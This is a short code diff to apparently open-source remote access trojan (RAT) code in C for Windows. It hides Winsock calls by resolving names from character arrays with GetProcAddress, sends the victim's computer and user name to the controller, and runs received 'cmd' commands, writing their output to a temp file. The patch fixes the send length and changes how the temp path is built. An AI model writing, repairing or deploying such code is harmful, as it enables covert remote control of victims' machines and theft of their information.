@@ -28,7 +28,7 @@ struct RATSocket
 	_WSAGetLastError *f_WSAGetLastError;	
 };
 
-int SocketSend(RATSocket* ratSocket, char* messageBuffer, int bufferSize)
+int SocketSend(RATSocket* ratSocket, char* messageBuffer, unsigned int bufferSize)
 {
 	char ca_send[] = { 's','e','n','d', 0};
 	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
@@ -221,7 +221,7 @@ WinMain(HINSTANCE hInstance,
 
 			char bufferInfo[SOCKET_BUFFER_SIZE];
 			sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
-			SocketSend(&ratSocket, bufferInfo, SOCKET_BUFFER_SIZE);
+			SocketSend(&ratSocket, bufferInfo, (unsigned int)strlen(bufferInfo));
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
@@ -265,7 +265,7 @@ WinMain(HINSTANCE hInstance,
 			CloseHandle(pi.hThread);
 
 			char filePath[MAX_PATH];
-			GetTempPathA(MAX_PATH, filePath);
+			strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
 			strncat_s(filePath, "test.txt", 8);
 
 			FILE* fs;
